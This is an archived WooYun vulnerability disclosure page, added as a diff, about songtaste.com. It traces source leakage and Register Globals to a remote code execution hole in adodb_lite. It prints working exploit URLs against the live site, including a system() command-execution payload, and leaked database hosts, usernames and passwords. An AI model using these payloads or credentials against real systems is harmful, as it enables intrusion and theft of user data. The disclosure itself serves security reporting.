@@ -1,0 +1,255 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		songtaste.com主站任意代码执行漏洞可能导致所有用户数据泄漏  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		songtaste.com主站任意代码执行漏洞可能导致所有用户数据泄漏  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xsser">xsser</a> 
+</li><li>提交时间：		2011-02-28 19:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-02-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-03-05：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Songtaste.com是一个纯粹的web2.0的音乐分享网站，具有数量众多的用户，但是其中的一些不恰当的配置和代码可能导致任意代码执行漏洞可能导致所有用户数据泄漏（已经验证）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">	首先，我发现在搜索引擎里搜索songtaste.com的话（个人习惯，由于上次报告问题给songtaste.com的时候他们没有重视，我想找到当时的注射放到新开的认领里，这样可能以更好的渠道让他们重视）<br />
+<br />
+<br />
+<br />
+	</p><pre><code>inurl:php?id= site:songtaste.com</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+	会发现image.songtaste.com会直接泄漏源码，访问时依然可以直接下载，这就是SongTaste.com遇到的第一个问题，我猜测这是www.songtaste.com的一台备份服务器，并且由于一些原因去掉了php的解析，而操作者很明显没有注意到该台服务器其中包含的php文件的泄漏问题。通过该问题和www上的一些应用逻辑，我可以下载到了任意的代码。<br />
+<br />
+	本来是想通过php代码来寻找漏洞以尝试获得应用的访问权限，但是在读了一些代码之后，我发现服务器的php的设置为<br />
+<br />
+<br />
+<br />
+</p><pre><code>Register Globals on<br />
+	Magic Quote on</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+	这样的配置，因为他程序里的变量都是系统自动生成的，逻辑里没有特别注册为全局变量的代码。这里特别是Register Globals为on的设置将导致更多的安全问题，所以我就继续寻找问题。前台没有太多特殊的东西，于是我尝试寻找后台那些不对外开放的逻辑里可能存在更多的安全问题。<br />
+<br />
+	后台很容易寻找，事实上也是上次一位白帽子反馈给我的一个问题<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.songtaste.com/administrator/</code></pre><p class='detail'><br />
+<br />
+	在后台里的代码里的这么一行引起了我的注意<br />
+<br />
+<br />
+<br />
+</p><pre><code>include(S_CFG_PATH.&#039;global.cfg.php&#039;);<br />
+	include(S_LIB_PATH.&#039;adodb_lite&#039; . DS . &#039;adodb.inc.php&#039;);<br />
+	include(S_LIB_PATH.&#039;global.fn.php&#039;);</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+	其中adodb_lite是一个第三方的库，大家知道，对于第三方的库，其实安全性是最无法得到保障的，因为一些原因，很多的安全研究者乐于寻找其中的安全问题并且披露出来，我早期在blog里（大概是07年），曾经披露过该库的一个远程代码执行漏洞，具体原因是由于变量未初始化导致的，利用环境是需要可以自动注册全局变量。<br />
+<br />
+<br />
+<br />
+</p><pre><code>eval(&#039;class perfmon_parent_EXTENDER extends &#039; . $last_module . &#039;_ADOConnection { }&#039;);<br />
+测试方式为：<br />
+adodb-perf-module.inc.php?last_module=Exception{};phpinfo();/*</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+	但是因为是个人Blog性质，估计注意的人不多，所以这个问题在很多的企业程序里依然存在，因为他们的代码不开源，所以一段时间风险还不会暴露，但是一旦发生今天这种由于配置将程序目录结构和逻辑及组件对外公开的情况就会导致严重的问题了。由于服务器的配置满足我们的利用（Register Globals on）<br />
+<br />
+	根据目录结构，我们反推实际的线上URL为<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.songtaste.com/administrator/lib/adodb_lite/adodb-perf-module.inc.php?last_module=Exception{};phpinfo();/*<br />
+<br />
+	很幸运，一击即中，站点沦陷，数据全部可以控制了。<br />
+&lt;code&gt;<br />
+http://www.songtaste.com/administrator/lib/adodb_lite/adodb-perf-module.inc.php?d=w&amp;last_module=Exception{};system(stripslashes($_GET[d]));die();/*</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2819503494f4cccb5eae9e17d402d842bc3b69b7.jpg" target="_blank"><img src="../images/2819503494f4cccb5eae9e17d402d842bc3b69b7.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/281950212eac7acdbe0cfcf66f9f82c9fe99e23d.jpg" target="_blank"><img src="../images/281950212eac7acdbe0cfcf66f9f82c9fe99e23d.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>&lt;?<br />
+//if( substr($REMOTE_ADDR,0,9) ==&quot;61.156.40&quot; || $REMOTE_ADDR == &quot;120.193.10.226&quot; || $REMOTE_ADDR==&quot;112.91.130.194&quot;)<br />
+//	die(&quot;&quot;);<br />
+<br />
+<br />
+//dies(&quot;十分抱歉，数据库维护，请5分钟后访问&quot;);<br />
+class MySqlDB extends DB_Sql<br />
+{<br />
+        <br />
+        var $Host        = &quot;192.168.50.245&quot;;<br />
+        var $Database    = &quot;ST&quot;;<br />
+        var $User        = &quot;stweb_write&quot;;<br />
+        var $Password    = &quot;stweb_12Hjkdff&quot;; <br />
+<br />
+		var $Host_read        = &quot;192.168.50.242&quot;;<br />
+        var $Database_read    = &quot;ST&quot;;<br />
+        var $User_read        = &quot;read_web&quot;;<br />
+        var $Password_read    = &quot;read_web!@#&quot;; <br />
+         <br />
+		function MySqlDB($index=0) {<br />
+			if($index==1) {<br />
+				$this-&gt;Host        = &quot;192.168.50.242&quot;;<br />
+				$this-&gt;Database    = &quot;ST&quot;;<br />
+				$this-&gt;User        = &quot;stweb_write&quot;;<br />
+				$this-&gt;Password    = &quot;stweb_12Hjkdff&quot;;<br />
+			}<br />
+		}<br />
+		<br />
+}<br />
+$DB= new MySqlDB;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你觉得呢？ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xsser" title="xsser">xsser</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01455" title="songtaste.com主站任意代码执行漏洞可能导致所有用户数据泄漏">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2011-03-03 22:37</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：20 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1455";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
